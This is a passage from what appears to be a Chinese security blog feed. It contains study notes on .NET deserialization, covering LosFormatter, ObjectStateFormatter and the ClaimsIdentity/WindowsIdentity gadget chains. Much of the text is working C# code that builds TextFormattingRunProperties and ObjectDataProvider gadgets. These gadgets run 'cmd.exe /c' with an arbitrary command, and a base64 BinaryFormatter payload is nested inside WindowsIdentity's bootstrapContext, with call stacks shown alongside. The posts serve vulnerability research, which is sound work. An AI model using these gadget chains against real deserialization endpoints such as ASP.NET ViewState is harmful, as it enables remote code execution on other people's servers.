GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(typeof(WindowsPrincipal));</span><br><span class="line">            info.AddValue(&quot;m_identity&quot;, wi);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [Serializable]</span><br><span class="line">    public class TextFormattingRunPropertiesMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        string _xaml;</span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = typeof(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        public TextFormattingRunPropertiesMarshal(string cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            // ObjectDataProvider</span><br><span class="line">            ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">            psi.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">            psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span><br><span class="line">            StringDictionary dict = new StringDictionary();</span><br><span class="line">            psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = new Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = new ObjectDataProvider();</span><br><span class="line">            odp.MethodName = &quot;Start&quot;;</span><br><span class="line">            odp.IsInitialLoadEnabled = false;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets-1"><a href="#Gadgets-1" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>其实这里用的原理就是ClaimsIdentity链子的原理 </p><p>LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段</p><p><img src="../images/image-20240306171041228.png" alt="image-20240306171041228"></p><p><img src="../images/image-20240306171108616.png" alt="image-20240306171108616"></p><p>这里反序列化的时候  就会反序列化WindowsIdentity类  那么我们进入到这个类的反序列化构造函数中去</p><p><img src="../images/image-20240306171236950.png" alt="image-20240306171236950"></p><p>发现其调用了其父类ClaimsIdentity的反序列化构造方法  我们接着跟进</p><p><img src="../images/image-20240306171249757.png" alt="image-20240306171249757"></p><p><img src="../images/image-20240306171305016.png" alt="image-20240306171305016"></p><p>又因为我们之前给了bootstrapContext赋值 那么这里的话就会对我们传入的字符串进行base64解码  然后再进行反序列化操作</p><p>这样就结束了</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ClaimsIdentity.Deserialize()</span><br><span class="line">new ClaimsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">new WindowsIdentity()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>06  07基本都是多加一个类少加一个类的关系   本质上差不多</p><p>除了关注反序列化方法传入的参数值，还需要注意使用LosFormatter和ObjectStatesFormatter可能会造成二次反序列化，要关注object类型的字段。</p><p>这两个反序列化的东西  都会反序列化其类里的object参数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-06</title>
    <link href="https://ke1nys.github.io/posts/3a9f8f94.html"/>
    <id>https://ke1nys.github.io/posts/3a9f8f94.html</id>
    <published>2024-03-05T02:49:56.000Z</published>
    <updated>2024-03-12T14:41:01.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LosFormatter"><a href="#LosFormatter" class="headerlink" title="LosFormatter"></a>LosFormatter</h2><p>LosFormatter一般用于序列化存储视图流状态，多用于Web窗体，如ViewState。LosFormatter封装在System.Web.dll中，命名空间为System.Web.UI，使用LosFormatter反序列化不信任的数据会造成RCE。</p><p><img src="../images/image-20240305110405937.png" alt="image-20240305110405937"></p><p>两个参数的构造方法表示使用”启用mac”和”mac密钥修饰符”来初始化LosFormatter。使用LosFormatter序列化对象仍需要标记[Serializable]</p><p><strong>demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">Serializable</span>]</span><br><span class="line">        <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="built_in">string</span> Name</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">get</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">                <span class="keyword">set</span> &#123; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="built_in">int</span> Age</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">get</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">                <span class="keyword">set</span> &#123; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name, <span class="built_in">int</span> age</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                Name = name;</span><br><span class="line">                Age = age;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                losFormatter.Serialize(memory, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>, <span class="number">15</span>));</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)losFormatter.Deserialize(memory);</span><br><span class="line">                p.SayHello();</span><br><span class="line">                Console.WriteLine(Encoding.UTF8.GetString(memory.ToArray()));</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240305111501233.png" alt="image-20240305111501233"></p><p>可见losformatter序列化之后的对象是base64编码的，以<code>/wEyt</code>开头，实战中应注意。</p><p>LosFormatter有多个反序列化Deserialize()重载</p><p><img src="../images/image-20240305111600024.png" alt="image-20240305111600024"></p><p>反序列化方法也有多个重载方法  字符流和字符串都可以接受</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    LosFormatter losFormatter = new LosFormatter();</span><br><span class="line">    Person p = (Person)losFormatter.Deserialize(&quot;/wEytAEAAQAAAP////8BAAAAAAAAAAwCAAAATkxvc0Zvcm1hdHRlckRlc2VyaWFsaXplLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJkxvc0Zvcm1hdHRlckRlc2VyaWFsaXplLlByb2dyYW0rUGVyc29uAgAAAARuYW1lA2FnZQEACAIAAAAGAwAAAARqYWNrDwAAAAs=&quot;);</span><br><span class="line">    p.SayHello();</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240305112109672.png" alt="image-20240305112109672"></p><p><img src="../images/image-20240305112202095.png" alt="image-20240305112202095"></p><p>跟进其反序列化函数发现   其反序列化使用的是<code>ObjectStateFormatter</code>来进行反序列化</p><p><img src="../images/image-20240305112339413.png" alt="image-20240305112339413"></p><p>先从base64转字节数组，然后判断是否启用mac等。</p><p>LosFormatter交由ObjectStateFormatter反序列化处理，<strong>二次反序列化来进行处理</strong></p><h2 id="ClaimsIdentity"><a href="#ClaimsIdentity" class="headerlink" title="ClaimsIdentity"></a>ClaimsIdentity</h2><p>这里起的标题是这个ClaimsIdentity   但是等会接下来用的链子不会用到这个链子  只是说会用到这里类的反序列化流程</p><p><img src="../images/image-20240305143221444.png" alt="image-20240305143221444"></p><p><img src="../images/image-20240305143233918.png" alt="image-20240305143233918"></p><p>将自身m_bootstrapContext字段对象存放到<code>System.Security.ClaimsIdentity.bootstrapContext</code>中。而该字段是object类型。并且没有标记NonSerialized</p><p>此时写一个案例来看下当类自身字段<strong>(就是属性)</strong>值为object类型时的堆栈。 </p><p>(其实就是模拟上述ClaimsIdentity类的调用过程)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.Security;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                My my = <span class="keyword">new</span> My();</span><br><span class="line">                my.o = textFormattingRunPropertiesMarshal;</span><br><span class="line">                losFormatter.Serialize(memory,my);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">My</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()at C:\Users\sdbdb\AppData\Roaming\JetBrains\Rider2022.1\resharper-host\DecompilerCache\decompiler\daf9a58f03a34857b2a38723152cb62e26c10\c9\edb1d909\TextFormattingRunProperties.cs:line 863</span><br><span class="line">new TextFormattingRunProperties()at C:\Users\sdbdb\AppData\Roaming\JetBrains\Rider2022.1\resharper-host\DecompilerCache\decompiler\daf9a58f03a34857b2a38723152cb62e26c10\c9\edb1d909\TextFormattingRunProperties.cs:line 119</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>仔细看的话在调用到<code>ObjectStateFormatter</code>这个类的时候  还会接着调用<code>BinaryFormatter</code>这个类来接着进行反序列化操作</p><p>那么至此可知，LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段。<strong>这也是ClaimsIdentity链的原理，套娃二次反序列化。</strong></p><p><strong>(给ClaimsIdentity的m_bootstrapContext参数传入对象的话  链子就会连起来)</strong></p><h2 id="WindowsIdentity"><a href="#WindowsIdentity" class="headerlink" title="WindowsIdentity"></a>WindowsIdentity</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            BinaryFormatter bf = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                bf.Serialize(memory, textFormattingRunPropertiesMarshal);</span><br><span class="line">                <span class="built_in">string</span> b64payload = Convert.ToBase64String(memory.ToArray());</span><br><span class="line">                WindowsIdentityIdentityMarshal windowsIdentityIdentityMarshal = <span class="keyword">new</span> WindowsIdentityIdentityMarshal(b64payload);</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Serialize(memory, windowsIdentityIdentityMarshal);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WindowsIdentityIdentityMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">WindowsIdentityIdentityMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(WindowsIdentity));</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.actor&quot;</span>, B64Payload);</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.bootstrapContext&quot;</span>, B64Payload);</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.claims&quot;</span>, B64Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        